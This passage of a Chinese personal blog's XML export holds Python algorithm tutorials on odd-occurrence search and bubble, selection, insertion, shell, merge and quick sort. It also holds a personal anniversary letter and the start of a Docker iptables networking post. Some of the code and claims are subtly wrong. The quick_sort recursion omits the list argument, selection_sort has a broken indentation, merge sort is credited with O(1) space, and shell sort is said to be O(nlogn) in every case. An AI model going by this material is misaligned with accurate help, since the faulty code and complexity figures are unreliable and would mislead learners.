class="line">            cnt += <span class="number">1</span></div><div class="line">    <span class="keyword">if</span> cnt % <span class="number">2</span> != <span class="number">0</span>:</div><div class="line">        <span class="keyword">return</span> arr[i]</div></pre></td></tr></table></figure>
<p>　　<strong>改进版本：</strong></p>
<p>　　借用计数排序的思想，先找到数组中最大的元素，然后开辟一个新数组，原数组中每个元素的值即为新数组的下标，遍历原数组记录每个元素出现的次数，最后遍历新数组，找到奇数，返回其下标。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_odd_times_num</span><span class="params">(arr)</span>:</span></div><div class="line">    m = max(arr)</div><div class="line">    cnt = [<span class="number">0</span>] * m</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arr:</div><div class="line">        cnt[i<span class="number">-1</span>] += <span class="number">1</span></div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(m):</div><div class="line">        <span class="keyword">if</span> cnt[j] % <span class="number">2</span> != <span class="number">0</span>:</div><div class="line">            <span class="keyword">return</span> j+<span class="number">1</span></div></pre></td></tr></table></figure>
<h4 id="Map-统计"><a href="#Map-统计" class="headerlink" title="Map + 统计"></a>Map + 统计</h4><h5 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h5><p>　　遍历数组记录出现次数先计数，并存储到 Map 中，再遍历 Map，找出 Map 中 value 为奇数的 key。</p>
<h5 id="Python-实现-2"><a href="#Python-实现-2" class="headerlink" title="Python 实现"></a>Python 实现</h5><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_odd_times_num</span><span class="params">(arr)</span>:</span></div><div class="line">    dict = &#123;&#125;</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arr:</div><div class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> dict:</div><div class="line">            dict[i] += <span class="number">1</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            dict[i] = <span class="number">1</span></div><div class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> dict.items():</div><div class="line">        <span class="keyword">if</span> v % <span class="number">2</span> != <span class="number">0</span>:</div><div class="line">            <span class="keyword">return</span> k</div></pre></td></tr></table></figure>
<h4 id="位运算"><a href="#位运算" class="headerlink" title="位运算"></a>位运算</h4><h5 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h5><p>　　巧妙地采用异或的特点进行处理，即整数 n 与 0 的异或结果为 n，整数 n 与 n 的异或结果为 0，异或运算满足交换律和结合律。即，所有出现偶数次的数异或的结果为 0，而对于出现次数为奇数次n的数，其出现的前 n-1 次异或的结果为 0，而 0 与其最后1次出现进行异或，得到该数本身。因此，可以很方便找出出现次数为奇数次的数。</p>
<h5 id="Python-实现-3"><a href="#Python-实现-3" class="headerlink" title="Python 实现"></a>Python 实现</h5><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_odd_times_num</span><span class="params">(arr)</span>:</span></div><div class="line">    res = <span class="number">0</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arr:</div><div class="line">        res ^= i</div><div class="line">    <span class="keyword">return</span> res</div></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Algorithm</category>
        <category>Basic</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Algorithm</tag>
      </tags>
  </entry>
  <entry>
    <title>爱你的365天</title>
    <url>/2019/04/15/%E7%88%B1%E4%BD%A0%E7%9A%84365%E5%A4%A9/</url>
    <content><![CDATA[<center>未来可期。</center>

<a id="more"></a>
<p>　　一年四季，陪你走过了一个春夏秋冬。不知不觉，在一起已经一年了，尽管365天都看似很平淡，但是，在我心里，和你在一起的每一天都是幸福。</p>
<p>　　在一起的每一天，我们都保持聊天，每天分享心情，互道晚安。也经常聊到本科时候的事情，于是尝试着去找当年的聊天记录，可惜没能全部保存下来。因此，现在经常备份聊天记录，总想着或许在将来的某一天会想回顾在一起的点点滴滴。最近想着把照片打印出来，我才发现这一年，留下的影像资料真是屈指可数。很是后悔，没能和你多拍一些照片，不知道为什么，你竟然也不怎么喜欢拍照。这一年里，和你在一起的时间慢慢增加，经常去湖大看你，陪你学习，和你一起散散步、看看电影，做一些有趣的事情。可惜你来中南的次数是真的很少，某只大懒虫就是不想走，我也没有办法。这一年里，计划着去做一些事情，最后都因为各种各样的原因没能达成，希望未来我们可以去尝试更多没有一起做过的事情。</p>
<p>　　经过一年的互相调教，我们的性格、脾气都有了很大的转变，我们也变得越来越了解对方。本来我就是一个没有什么脾气的人，现在的我那更是毫无脾气了啊。回顾过去的一年，几乎我每次生气，你都会反过来生气，然后我又得去哄你，经历过好几次这样的事情以后，我现在真的都不敢生气了。或者说，现在我会更多地照顾你的情绪了。我们也经历过几次危机，有关信任的，也有关于价值观的，不过还好，最后都在磕磕碰碰中走过来了。我真诚地反思自己，确实很多时候，我都是在教育你，有时候甚至是把自己的价值观强加给你。有时候，我也会很自责对你过于严厉，不像是男朋友应该做的。但是，我的初心绝对是好的，我希望你变得更厉害，希望你变得更坚强，希望我不在的时候你也可以独当一面。</p>
<p>　　经过一年的了解，我知道你性格很急躁，总想着，做一点就能看到效果。和你说过很多次，科研确实是漫长的过程，需要静下心来慢慢去探索。可是，你经常会因为一些事情受到打击，然后开始消极。每次我都特别担心你，担心你真的会放弃，所以即使你把气撒在我身上，我也是好好地和你说。甚至，跑过去给你拥抱。因为我知道，内心里有些东西是很难一下子去改变的，我也知道你的努力，理解你的委屈，所以我想要给你拥抱，给你鼓励呀。另外，我也知道你的内心其实是很脆弱的，因为学业压力，因为受委屈，在我面前哭过几次，我都能理解。你能在我面前做最真实的自己，那也是爱我的表现。不过，我也经常给你做思想工作，开导你，希望你可以变得更坚强。总之，你要知道，不管遇到什么困难，我都会陪着你啊。</p>
<p>　　我发现，你还是一个不善于表达情感的人。说点心里话，有时候，我也会很无奈，总感觉不管怎么努力爱你，怎么为你用心，你给我的反馈好像都差不多。我每次问你，你总说害羞，一些感情的表达，明明可以当面说给我听，每次都要等我回去然后通过微信告诉我。所以啊，有时候就是会多想，我的努力是不是没有意义，会不会让你觉得应该感谢才会事后和我说，而不是那种感动。直到现在，我还是不太明白，我应该做什么，你才会真的发自内心的开心，或者感到很幸福。希望你有时候，也可以顾及一下我的感受，要不然，我会觉得很累的。有时候，我也会有小情绪，当然，我会尽量克制自己，因为我不想伤害你。就像你和我说的，如果你很不开心了或者生气了，我给你一个拥抱你就会。所以，如果我的小情绪影响到你了，请你也给我一个拥抱，让我能够冷静下来。另外，两个人在一起，就应该互相帮助，共同进步。我其实也有很多缺点，可是，你好像都不会教育我，只会生气。你可以好好给我讲道理，我也会认真听你的。希望我们能够共同进步，一起变得更好。</p>
<p>　　一个月前就开始在知乎上看，想着一周年的时候给你送什么礼物，后来又下载了小红书，在上面找礼物。一番挑选之后，还是觉得应该送一个既能够表达心意，又很有意义的东西。之前听你说过，你喜欢类似音乐水晶球这种小物件，于是最后觉得做一个房子模型，寓意给你一个家。给你写了一张贺卡，给你做了一个家，希望以后可以给你一个真正的家。花了一周的时间，完成了这个手工小屋，自我柑橘还挺不错，感觉自己又get了新技能。第一次，花这么多时间去完成一件手工作品，每一个细节都用心去完成，每天中午不睡觉、晚上熬夜在做，就怕到一周年这一天还做不完。关键是还不能让你知道，晚上和你聊天的时候还得忽悠你。不过，我觉得，能够为一个人去付出，以后回想起来应该也会是很nice的。最近，你总说没有不开心，这一次，我不仅仅是要送给你一件礼物，我还要用实际行动告诉你怎么变得开心。最近给你做这个小礼物，虽然每天都很累，但是我觉得能够为自己，为爱的人去用心付出，内心是很开心的。所以，希望你能够找到让自己的快乐的事情，为自己、为家人或者为我做一些有意义的事情，让自己保持积极乐观的心态，每一天都开开心心的。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2019/4/15-1.jpg" alt="15-1"></p>
<p>　　收到你给我写的信，我真的十分感动，就好像第一次接收到来自你内心真挚的表达。你说，你以前的生气其实大部分情绪都来自我对你可能的误解，其实，互相都有误解吧，所以才会有生气的时候。还好现在我们越来越了解对方，这样的误解也就越来越少。你说，你害怕你在我心里会没有一丝美好，所以你要变得优秀。我当然是希望你变得更优秀啦，但是，你也要相信，无论什么时候，你在我心里都是最棒的。你说，我们很少有机会能走出校园，去外面疯玩，不谈学习，没有一点心理压力的状态。其实，偶尔放下包袱出去放松放松也未尝不可。以后，我们好好计划计划，一起去经历更多。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2019/4/15-2.jpg" alt="15-2"></p>
<p>　　相信我们会越来越爱对方，像你说的，我们互相容纳对方的缺点，我们互相鼓励对方，我们互相相信对方，我们互相理解对方，我们互相相依到老。未来可期。</p>
]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title>归并排序与快速排序</title>
    <url>/2019/03/17/%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F%E4%B8%8E%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F/</url>
    <content><![CDATA[<center>基础算法复习：归并排序与快速排序。</center>

<a id="more"></a>
<h4 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h4><h5 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h5><p>　　归并排序（Merge sort）是建立在归并操作上的一种有效的排序算法。该算法是采用分治法（Divide and Conquer）的一个非常典型的应用。该算法是采用分治法（Divide and Conquer）的一个非常典型的应用。归并排序是一种稳定的排序方法。将已有序的子序列合并，得到完全有序的序列；即先使每个子序列有序，再使子序列段间有序。</p>
<p>　　操作步骤如下：</p>
<ol>
<li>申请空间，使其大小为两个已经排序序列之和，该空间用来存放合并后的序列；</li>
<li>设定两个指针，最初位置分别为两个已经排序序列的起始位置；</li>
<li>比较两个指针所指向的元素，选择相对小的元素放入到合并空间，并移动指针到下一位置；</li>
<li>重复步骤 3 直到某一指针达到序列尾；</li>
<li>将另一序列剩下的所有元素直接复制到合并序列尾。</li>
</ol>
<p>　　示例，动图演示：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2019/3/17-1.gif" alt="17-1"></p>
<h5 id="Python-实现"><a href="#Python-实现" class="headerlink" title="Python 实现"></a>Python 实现</h5><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">merge</span><span class="params">(left, right)</span>:</span></div><div class="line">    print(left, right)</div><div class="line">    res = []</div><div class="line">    i, j = <span class="number">0</span>, <span class="number">0</span></div><div class="line">    <span class="keyword">while</span> i &lt; len(left) <span class="keyword">and</span> j &lt; len(right):</div><div class="line">        <span class="keyword">if</span> left[i] &gt; right[j]:</div><div class="line">            res.append(right[j])</div><div class="line">            j += <span class="number">1</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            res.append(left[i])</div><div class="line">            i += <span class="number">1</span></div><div class="line">    <span class="keyword">if</span> i &lt; len(left):</div><div class="line">        res.extend(left[i:])</div><div class="line">    <span class="keyword">if</span> j &lt; len(right):</div><div class="line">        res.extend(right[j:])</div><div class="line">    <span class="keyword">return</span> res</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">merge_sort</span><span class="params">(nums)</span>:</span></div><div class="line">    <span class="keyword">if</span> len(nums) &lt;= <span class="number">1</span>:</div><div class="line">        <span class="keyword">return</span> nums</div><div class="line">    mid = len(nums) // <span class="number">2</span></div><div class="line">    left = merge_sort(nums[:mid])</div><div class="line">    right = merge_sort(nums[mid:])</div><div class="line">    <span class="keyword">return</span> merge(left, right)</div></pre></td></tr></table></figure>
<h5 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h5><ul>
<li>最优时间复杂度：O(nlogn)。</li>
<li>最坏时间复杂度：O(nlogn)。</li>
<li>平均时间复杂度：O(nlogn)。</li>
<li>空间复杂度：O(1)。</li>
<li>稳定性：稳定。</li>
</ul>
<h4 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h4><h5 id="基本思路-1"><a href="#基本思路-1" class="headerlink" title="基本思路"></a>基本思路</h5><p>　　快速排序（Quick Sort）是对冒泡排序的一种改进，基本思想是选取一个记录作为基准，通过一趟排序将待排记录分隔成独立的两部分，其中一部分记录的关键字均比另一部分的关键字小，则可分别对这两部分记录继续进行排序，以达到整个序列有序。快速排序是一种分而治之思想在排序算法上的典型应用。</p>
<p>　　操作步骤如下：</p>
<ol>
<li>从数列中挑出一个元素，称为 “基准”（pivot）;</li>
<li>重新排序数列，所有元素比基准值小的摆放在基准前面，所有元素比基准值大的摆在基准的后面（相同的数可以到任一边）。在这个分区退出之后，该基准就处于数列的中间位置。这个称为分区（partition）操作；</li>
<li>递归地（recursive）把小于基准值元素的子数列和大于基准值元素的子数列排序。</li>
</ol>
<p>　　示例，动图演示：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2019/3/17-2.gif" alt="17-2"></p>
<h5 id="Python-实现-1"><a href="#Python-实现-1" class="headerlink" title="Python 实现"></a>Python 实现</h5><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">quick_sort</span><span class="params">(nums, left, right)</span>:</span></div><div class="line">    <span class="keyword">if</span> left &gt; right:</div><div class="line">        <span class="keyword">return</span></div><div class="line">    tmp = nums[left]</div><div class="line">    i = left</div><div class="line">    j = right</div><div class="line">    <span class="keyword">while</span> i != j:</div><div class="line">        <span class="keyword">while</span> nums[j] &gt;= tmp <span class="keyword">and</span> i &lt; j:</div><div class="line">            j -= <span class="number">1</span></div><div class="line">        <span class="keyword">while</span> nums[i] &lt;= tmp <span class="keyword">and</span> i &lt; j:</div><div class="line">            i += <span class="number">1</span></div><div class="line">        <span class="keyword">if</span> i &lt; j:</div><div class="line">            nums[i], nums[j] = nums[j], nums[i]</div><div class="line">    nums[left] = nums[i]</div><div class="line">    nums[i] = tmp</div><div class="line">    quick_sort(left, i - <span class="number">1</span>)</div><div class="line">    quick_sort(i + <span class="number">1</span>, right)</div></pre></td></tr></table></figure>
<h5 id="时间复杂度-1"><a href="#时间复杂度-1" class="headerlink" title="时间复杂度"></a>时间复杂度</h5><ul>
<li>最优时间复杂度：O(nlogn)。</li>
<li>最坏时间复杂度：O(n**2)。</li>
<li>平均时间复杂度：O(nlogn)。</li>
<li>空间复杂度：O(logn)。</li>
<li>稳定性：不稳定。</li>
</ul>
]]></content>
      <categories>
        <category>Algorithm</category>
        <category>Basic</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Algorithm</tag>
      </tags>
  </entry>
  <entry>
    <title>插入排序与希尔排序</title>
    <url>/2019/03/16/%E6%8F%92%E5%85%A5%E6%8E%92%E5%BA%8F%E4%B8%8E%E5%B8%8C%E5%B0%94%E6%8E%92%E5%BA%8F/</url>
    <content><![CDATA[<center>基础算法复习：插入排序与希尔排序。</center>

<a id="more"></a>
<h4 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h4><h5 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h5><p>　　插入排序（Insertion-Sort）是一种简单直观的排序算法。它的工作原理是通过构建有序序列，对于未排序数据，在已排序序列中从后向前扫描，找到相应位置并插入。插入排序在实现上，通常采用in-place排序（即只需用到O(1)的额外空间的排序），因而在从后向前扫描过程中，需要反复把已排序元素逐步向后挪位，为最新元素提供插入空间。</p>
<p>　　操作步骤：</p>
<ol>
<li>将第一待排序序列第一个元素看做一个有序序列，把第二个元素到最后一个元素当成是未排序序列。</li>
<li>从头到尾依次扫描未排序序列，将扫描到的每个元素插入有序序列的适当位置（如果待插入的元素与有序序列中的某个元素相等，则将待插入元素插入到相等元素的后面）。</li>
</ol>
<p>　　示例，动图演示：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2019/3/16-1.gif" alt="16-1"></p>
<h5 id="Python-实现"><a href="#Python-实现" class="headerlink" title="Python 实现"></a>Python 实现</h5><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">insertion_sort</span><span class="params">(nums)</span>:</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)):</div><div class="line">        tmp = nums[i]</div><div class="line">        index = i</div><div class="line">        <span class="keyword">while</span> index &gt; <span class="number">0</span> <span class="keyword">and</span> nums[index<span class="number">-1</span>] &gt; tmp:</div><div class="line">            nums[index] = nums[index<span class="number">-1</span>]</div><div class="line">            index -= <span class="number">1</span></div><div class="line">        nums[index] = tmp</div><div class="line">        print(nums)</div></pre></td></tr></table></figure>
<h5 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h5><ul>
<li>平均时间复杂度：O(n**2)。</li>
<li>最优时间复杂度：O(n)。</li>
<li>最坏时间复杂度：O(n**2)。</li>
<li>空间复杂度：O(1)。</li>
<li>稳定性：稳定。</li>
</ul>
<h4 id="希尔排序"><a href="#希尔排序" class="headerlink" title="希尔排序"></a>希尔排序</h4><h5 id="基本思路-1"><a href="#基本思路-1" class="headerlink" title="基本思路"></a>基本思路</h5><p>　　递减增量排序算法，对<code>插入排序</code>的改进，实质是分组插入排序，又叫<code>缩小增量排序</code> 。<code>希尔排序</code>提升排序的奥秘就在于<code>数据元素越有序，使用插入排序效率越高</code> 。</p>
<p>　　操作步骤：</p>
<ol>
<li>先将待排数列分割成若干子序列（增量为m)。</li>
<li>对每个子序列使用<code>插入排序</code> 。</li>
<li>减小增量，再排序。</li>
<li>对全体元素做一次<code>插入排序</code> 。</li>
</ol>
<p>　　示例，动图演示：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2019/3/16-2.gif" alt="16-2"></p>
<h5 id="Python-实现-1"><a href="#Python-实现-1" class="headerlink" title="Python 实现"></a>Python 实现</h5><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">shell_sort</span><span class="params">(nums)</span>:</span></div><div class="line">    step = len(nums) // <span class="number">2</span></div><div class="line">    <span class="keyword">while</span> step:</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(step, len(nums)):</div><div class="line">            print(i)</div><div class="line">            <span class="keyword">while</span> i &gt;= step <span class="keyword">and</span> nums[i - step] &gt; nums[i]:  <span class="comment"># 子序列执行插入排序</span></div><div class="line">                nums[i], nums[i - step] = nums[i - step], nums[i]</div><div class="line">                i -= step</div><div class="line">        step = step // <span class="number">2</span></div><div class="line">    <span class="keyword">return</span> nums</div></pre></td></tr></table></figure>
<h5 id="时间复杂度-1"><a href="#时间复杂度-1" class="headerlink" title="时间复杂度"></a>时间复杂度</h5><ul>
<li>最优时间复杂度：O(nlogn)。</li>
<li>最坏时间复杂度：O(nlogn)。</li>
<li>平均时间复杂度：O(nlogn)。</li>
<li>空间复杂度：O(1)。</li>
<li>稳定性：不稳定。</li>
</ul>
]]></content>
      <categories>
        <category>Algorithm</category>
        <category>Basic</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Algorithm</tag>
      </tags>
  </entry>
  <entry>
    <title>冒泡排序与选择排序</title>
    <url>/2019/03/15/%E5%86%92%E6%B3%A1%E6%8E%92%E5%BA%8F%E4%B8%8E%E9%80%89%E6%8B%A9%E6%8E%92%E5%BA%8F/</url>
    <content><![CDATA[<center>基础算法复习：冒泡排序与选择排序。</center>

<a id="more"></a>
<h4 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h4><h5 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h5><p>　　冒泡排序（Bubble Sort）是一种简单的排序算法。它重复地遍历要排序的数列，一次比较两个元素，如果他们的顺序错误就把他们交换过来。遍历数列的工作是重复地进行直到没有再需要交换，也就是说该数列已经排序完成。这个算法的名字由来是因为越小的元素会经由交换慢慢“浮”到数列的顶端。</p>
<p>　　冒泡排序算法的操作步骤如下：</p>
<ul>
<li>比较相邻的元素。如果第一个比第二个大（升序），就交换他们两个。</li>
<li>对每一对相邻元素作同样的工作，从开始第一对到结尾的最后一对。这步做完后，最后的元素会是最大的数。</li>
<li>针对所有的元素重复以上的步骤，除了最后一个。</li>
<li>持续每次对越来越少的元素重复上面的步骤，直到没有任何一对数字需要比较。</li>
</ul>
<p>　　示例，动图演示：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2019/3/15-1.gif" alt="15-1"></p>
<h5 id="Python-实现"><a href="#Python-实现" class="headerlink" title="Python 实现"></a>Python 实现</h5><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">bubble_sort</span><span class="params">(nums)</span>:</span></div><div class="line">    n = len(nums)</div><div class="line">    swapped = <span class="keyword">True</span></div><div class="line">    x = <span class="number">-1</span></div><div class="line">    <span class="keyword">while</span> swapped:</div><div class="line">        swapped = <span class="keyword">False</span></div><div class="line">        x = x + <span class="number">1</span></div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, n - x):</div><div class="line">            <span class="keyword">if</span> nums[i - <span class="number">1</span>] &gt; nums[i]:</div><div class="line">                nums[i - <span class="number">1</span>], nums[i] = nums[i], nums[i - <span class="number">1</span>]</div><div class="line">                swapped = <span class="keyword">True</span></div><div class="line">        print(x, nums)</div><div class="line">    <span class="keyword">return</span> nums</div></pre></td></tr></table></figure>
<h5 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h5><ul>
<li>最优时间复杂度：O(n) （表示遍历一次发现没有任何可以交换的元素，排序结束）。</li>
<li>最坏时间复杂度：O(n**2)。</li>
<li>平均时间复杂度：O(n**2)。</li>
<li>空间复杂度：O(1)。</li>
<li>稳定性：稳定。</li>
</ul>
<h4 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h4><h5 id="基本思路-1"><a href="#基本思路-1" class="headerlink" title="基本思路"></a>基本思路</h5><p>　　选择排序（Selection sort）是一种简单直观的排序算法。它的工作原理如下。首先在未排序序列中找到最小（大）元素，存放到排序序列的起始位置，然后，再从剩余未排序元素中继续寻找最小（大）元素，然后放到已排序序列的末尾。以此类推，直到所有元素均排序完毕。</p>
<p>　　选择排序的主要优点与数据移动有关。如果某个元素位于正确的最终位置上，则它不会被移动。选择排序每次交换一对元素，它们当中至少有一个将被移到其最终位置上，因此对n个元素的表进行排序总共进行至多n-1次交换。在所有的完全依靠交换去移动元素的排序方法中，选择排序属于非常好的一种。</p>
<p>　　示例，动图演示：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2019/3/15-2.gif" alt="15-2"></p>
<h5 id="Python-实现-1"><a href="#Python-实现-1" class="headerlink" title="Python 实现"></a>Python 实现</h5><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">selection_sort</span><span class="params">(nums)</span>:</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)<span class="number">-1</span>):</div><div class="line">        min_index = i</div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(i+<span class="number">1</span>, len(nums)):</div><div class="line">            <span class="keyword">if</span> nums[min_index] &gt; nums[j]:</div><div class="line">                min_index = j</div><div class="line">        print(i, min_index)</div><div class="line">        <span class="keyword">if</span> i != min_index:</div><div class="line">            nums[i], nums[min_index] = nums[min_index], nums[i]</div><div class="line">     <span class="keyword">return</span> nums</div></pre></td></tr></table></figure>
<h5 id="时间复杂度-1"><a href="#时间复杂度-1" class="headerlink" title="时间复杂度"></a>时间复杂度</h5><ul>
<li>平均时间复杂度：O(n**2)。</li>
<li>最优时间复杂度：O(n**2)。</li>
<li>最坏时间复杂度：O(n**2)。</li>
<li>空间复杂度：O(1)。</li>
<li>稳定性：不稳定（考虑升序每次选择最大的情况）。</li>
</ul>
]]></content>
      <categories>
        <category>Algorithm</category>
        <category>Basic</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Algorithm</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker-基本操作-网络篇（中）</title>
    <url>/2019/03/12/Docker-%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C-%E7%BD%91%E7%BB%9C%E7%AF%87%EF%BC%88%E4%B8%AD%EF%BC%89/</url>
    <content><![CDATA[<p><center>Docker 网络基本操作介绍。</center><br><a id="more"></a></p>
<h4 id="IPtables"><a href="#IPtables" class="headerlink" title="IPtables"></a>IPtables</h4><p>　　Linux 的防火墙由 Netfilter 和 Iptables 组成。用户空间的 Iptables 制定防火墙规则，内核空间的 Netfilter 实现防火墙功能。Netfilter （内核空间）位于Linux内核中的包过滤防火墙功能体系，称为 Linux 防火墙的“内核态”。 Iptables （用户空间）位于 /sbin/iptables，是用来管理防火墙的命令的工具，为防火墙体系提供过滤规则/策略，决定如何过滤或处理到达防火墙主机的数据包，称为 Linux 防火墙的“用户态”。</p>
<h5 id="白名单和黑名单"><a href="#白名单和黑名单" class="headerlink" title="白名单和黑名单"></a>白名单和黑名单</h5><p>　　制作防火墙规则通常有两种基本策略。<strong>一是黑名单策略；二是白名单策略。</strong></p>
<ul>
<li>黑名单策略指没有被拒绝的流量都可以通过，这种策略下管理员必须针对每一种新出现的攻击，制定新的规则，因此不推荐。</li>
<li>白名单策略指没有被允许的流量都要拒绝，这种策略比较保守，根据需要逐渐开放，目前一般都采用白名单策略，推荐。</li>
</ul>
<h5 id="四表五链"><a href="#四表五链" class="headerlink" title="四表五链"></a>四表五链</h5><p>　　Iptables 有四表五链(其实有五表，是后来加进来的)，四表分别是下图的的 <code>raw，mangle，nat，filter</code> 表。五链分别是 <code>PREROUTING，INPUT，OUTPUT，FORWARD，POSTROUTING</code> 链。表决定了数据报文处理的方式，而链则决定了数据报文的流经哪些位置。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2019/3/12-1.png" alt="12-1"></p>
<ul>
<li><p><strong>五链：</strong></p>
<ul>
<li>PREROUTING：数据包进入路由表之前；</li>
<li>INPUT：通过路由表后目的地为本机；</li>
<li>FORWARD：通过路由表后，目的地不为本机；</li>
<li>OUTPUT：由本机产生，向外转发；</li>
<li>POSTROUTIONG：发送到网卡接口之前。</li>
</ul>
</li>
<li><p><strong>四表：</strong></p>
<ul>
<li>filter 表：负责过滤功能，防火墙；内核模块：iptables_filter</li>
<li>nat 表：network address translation，网络地址转换功能；内核模块：iptable_nat</li>
<li>mangle 表：拆解报文，做出修改，并重新封装的功能；iptable_mangle</li>
<li>raw 表：关闭 nat 表上启用的连接追踪机制；iptable_raw</li>
</ul>
</li>
</ul>
<h5 id="处理流程"><a href="#处理流程" class="headerlink" title="处理流程"></a>处理流程</h5><p>　　处理流程下图所示，例如，制定一个filter表的规则，filter表决定是否放行数据包通过，那如果通过，则必须经由INPUT链流入数据包，INPUT链是处理入站数据的，如果没问题，继续放行到用户空间，再经由OUTPUT链将数据包流出。而对于 NAT 表的规则，NAT 表主要实现转发功能，数据包先经由PREROUTING链进行路由选择，选择好路线后再经由FORWARD链转发数据，然后再进行一个路由选择，最后由POSTROUTING链流出数据。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2019/3/12-2.png" alt="12-2"></p>
<h5 id="Iptables-语法"><a href="#Iptables-语法" class="headerlink" title="Iptables 语法"></a>Iptables 语法</h5><p>　　语法格式如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> iptables [-t 表名] 选项 [链名] [条件] [-j 控制类型]</span></div></pre></td></tr></table></figure>
<p>　　参数说明：</p>
<ul>
<li><code>-P</code>：设置默认策略：iptables；</li>
<li><code>-P</code>：INPUT (DROP|ACCEPT)；</li>
<li><code>-F</code>：清空规则链；</li>
<li><code>-L</code>：查看规则链；</li>
<li>`-A：在规则链的末尾加入新规则；</li>
<li><code>-I num</code>：在规则链的头部加入新规则；</li>
<li><code>-D num</code>：删除某一条规则；</li>
<li><code>-s</code>：匹配来源地址 IP/MASK，加叹号 “!” 表示除这个 IP 外；</li>
<li><code>-d</code>：匹配目标地址；</li>
<li><code>-i</code>：网卡名称 匹配从这块网卡流入的数据；</li>
<li><code>-o</code>：网卡名称 匹配从这块网卡流出的数据；</li>
<li><code>-p</code>：匹配协议,如tcp，udp，icmp；</li>
<li><code>--dport num</code>：匹配目标端口号；</li>
<li><code>--sport num</code>：匹配来源端口号。</li>
</ul>
<h5 id="SNAT、DNAT-与-MASQUERADE"><a href="#SNAT、DNAT-与-MASQUERADE" class="headerlink" title="SNAT、DNAT 与 MASQUERADE"></a>SNAT、DNAT 与 MASQUERADE</h5><ul>
<li><strong>SNAT（source network address translation，源地址目标转换）</strong></li>
</ul>
<p>　　局域网内的主机都配置了内网 IP，在访问外部网络的时候，路由器将数据包的报头中的源地址替换成路由器的 IP 。当外部网络的服务器比如网站 Web 服务器接到访问请求的时候，他的日志记录下来的是路由器的 IP 地址，而不是 主机的内网 IP 。因为，服务器收到的数据包的报头的“源地址”部分已经被替换。</p>
<ul>
<li><strong>DNAT（destination network address translation，目标网络地址转换）</strong></li>
</ul>
